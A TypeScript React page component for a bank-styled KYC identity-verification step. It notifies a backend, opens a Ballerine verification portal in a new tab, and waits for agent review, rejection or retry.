'use client';

/**
 * KYC (Know Your Customer) Stage Page
 *
 * Button-based KYC flow with new tab opening:
 * 1. User sees "Begin KYC Verification" button
 * 2. Click opens Ballerine in new tab
 * 3. User returns and clicks "I've Completed KYC"
 * 4. Backend notified and waits for agent review
 */

import { useState, useEffect } from 'react';
import { useSessionStore } from '@shared';
import { WaitingState } from '@/components/verification/WaitingState';
import { SplitLayout } from '@/components/layout/SplitLayout';
import { RBCButton, RBCFooter, ServiceNotices } from '@/components/ui/RBCComponents';
import { RBCWaitingState, VERIFICATION_STEPS } from '@/components/ui/RBCWaitingState';
import { Loader2 } from 'lucide-react';

export default function KYCPage() {
  const { status, caseId, agentMessage } = useSessionStore();

  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  /**
   * Listen for agent rejections and reset KYC state
   */
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      // Reset KYC status when agent rejects
      setKycStatus('not_started');
      setError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsLoading(false); // Reset loading state
    }
  }, [status, agentMessage]);

  /**
   * Begin KYC - notify backend and open Ballerine in new tab
   */
  async function handleBeginKYC() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    try {
      // 1. Notify backend/agent that user is starting KYC
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to start KYC process');
      }

      const data = await response.json();

      // 2. Get Ballerine URL from backend response
      const ballerineBaseUrl = data.kyc_url;

      if (!ballerineBaseUrl) {
        throw new Error('KYC provider is not configured properly (missing URL from backend)');
      }

      // 3. Build URL to open
      const kycUrl = `${ballerineBaseUrl}`;

      // 4. Open in NEW TAB
      window.open(kycUrl, '_blank');

      // 5. Update status to in_progress
      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error('KYC begin error:', err);
      setError('Unable to start KYC verification. Please try again or contact support.');
    }
  }

  /**
   * Handle KYC completion - user returns and confirms they completed KYC
   */
  async function handleKYCCompleted() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      // Notify backend that customer completed KYC
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit KYC');
      }

      // Update status to waiting for agent review
      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'KYC submitted. Waiting for agent review...',
      });
      // Don't set isLoading to false - keep waiting state until agent responds
    } catch (err) {
      console.error('KYC completion error:', err);
      setError('Failed to submit KYC. Please try again.');
      setIsLoading(false);
    }
  }

  /**
   * Manual retry button
   */
  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
  };

  return (
    <SplitLayout>
      <div className="w-full flex flex-col flex-1">
        <div className="mb-[40px] pb-[15px] border-b border-border">
          <h1 className="text-[18px] md:text-[20px] text-foreground font-normal m-0">
            Identity Verification
          </h1>
          <p className="text-[#555] text-[13px] mt-[10px] font-normal leading-snug">
            To ensure the security of your account, we require additional compliance verification.
          </p>
        </div>

        {kycStatus === 'waiting' ? (
          <RBCWaitingState
            message="Reviewing your documents..."
            steps={VERIFICATION_STEPS.kyc}
          />
        ) : (
          <div className="flex flex-col w-full mb-5">
            <div className="mb-[30px]">
              <p className="text-[#555] text-[13px] font-normal leading-snug">
                {kycStatus === 'not_started'
                  ? "Please click the button below to launch our secure identity verification portal. Have your government-issued ID ready."
                  : "Please complete the verification steps in the new secure window. Once finished, return to this page and click the completion button."
                }
              </p>
            </div>

            {error && (
              <div className="flex items-start gap-3 p-3 bg-red-50 rounded-md border border-red-200 mb-4">
                <p className="text-sm text-destructive">{error}</p>
              </div>
            )}

            <div className="my-[10px]">
              {kycStatus === 'not_started' && (
                <RBCButton onClick={handleBeginKYC}>
                  Begin KYC Verification
                </RBCButton>
              )}

              {kycStatus === 'in_progress' && (
                <div className="flex flex-col gap-4">
                  <RBCButton onClick={handleKYCCompleted} disabled={isLoading}>
                    {isLoading ? (
                      <span className="flex items-center justify-center gap-2">
                        <Loader2 className="h-4 w-4 animate-spin" />
                        Submitting...
                      </span>
                    ) : (
                      "I've Completed KYC"
                    )}
                  </RBCButton>

                  <button
                    onClick={handleRetry}
                    className="w-[150px] text-center text-accent text-[13px] hover:underline bg-transparent border-none cursor-pointer"
                    disabled={isLoading}
                  >
                    Start Over
                  </button>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </SplitLayout>
  );
}
